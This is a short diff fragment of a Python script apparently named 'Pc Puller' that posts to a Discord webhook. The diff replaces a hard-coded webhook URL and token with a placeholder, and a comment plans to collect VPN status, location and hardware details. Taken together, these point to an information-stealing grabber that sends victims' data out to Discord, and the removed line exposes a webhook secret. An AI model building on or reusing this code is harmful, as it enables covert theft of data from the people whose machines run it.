@@ -4,7 +4,7 @@ from json import dumps, loads
 from base64 import b64decode
 from re import findall
 webhookname = "Pc Puller"
-webhookurl = "https://discord.com/api/webhooks/864899008093749269/4J8_SlCHW1xAUBQnr-KcmNUsFPXKCtZpMRFqvGOlz9XpH80cL3pKVd0OdoVQzdGim8Sg"
+webhookurl = "YourWebhookHere"
 
 # Add vpn detect, loaction, ram, gpu, cpu,
 
